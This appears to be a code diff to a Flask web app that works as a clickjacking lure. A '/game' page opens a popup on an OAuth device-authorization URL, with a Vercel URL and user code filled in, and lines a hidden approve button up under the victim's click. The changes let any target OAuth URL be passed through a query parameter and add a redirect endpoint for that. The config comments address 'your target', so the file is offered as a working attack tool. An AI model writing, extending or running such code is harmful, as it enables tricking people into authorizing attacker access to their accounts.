@@ -8,7 +8,7 @@ import os
 # Configuration — edit these for your target
 # ---------------------------------------------------------------------------
 
-# Target OAuth device-authorization URL — edit this for your target
+# Fallback device-authorization URL (used when no ?url= param is provided)
 TARGET_URL = "https://vercel.com/oauth/device?user_code=DRMH-DHSK"
 
 POPUP_SIZE = [561, 560]                        # [width, height] of the popup
@@ -20,23 +20,27 @@ USE_HISTORY_BACK = False                      # False = reload URL; True = histo
 app = Flask(__name__)
 app.secret_key = os.urandom(24)
 
-# BUTTON_OFFSET is hard-coded above, so the saved-target fallback is skipped.
-# If you prefer to use a CSS selector + saved HTML, set BUTTON_OFFSET = None
-# and provide BUTTON_SELECTOR + saved-target files under static/saved-target/.
 button = BUTTON_OFFSET
+
+
+def get_target_url():
+    """Return the OAuth URL from query param or fall back to TARGET_URL."""
+    return request.args.get("url", TARGET_URL)
 
 
 @app.route("/")
 def index():
     domain = request.host.split(":")[0]
-    return render_template("index.html", domain=domain)
+    target_url = get_target_url()
+    return render_template("index.html", domain=domain, target_url=target_url)
 
 
 @app.route("/game")
 def game():
+    target_url = get_target_url()
     return render_template(
         "game.html",
-        url=TARGET_URL,
+        url=target_url,
         button=button,
         popup_size=POPUP_SIZE,
         use_history_back=USE_HISTORY_BACK,
@@ -46,6 +50,15 @@ def game():
 @app.route("/clear")
 def clear():
     return redirect(url_for("index"))
+
+
+@app.route("/api/url")
+def api_url():
+    """Convenience endpoint: redirect to /?url=<param>"""
+    target = request.args.get("url", "")
+    if target:
+        return redirect(url_for("index", url=target))
+    return {"error": "missing ?url= param"}, 400
 
 
 if __name__ == "__main__":
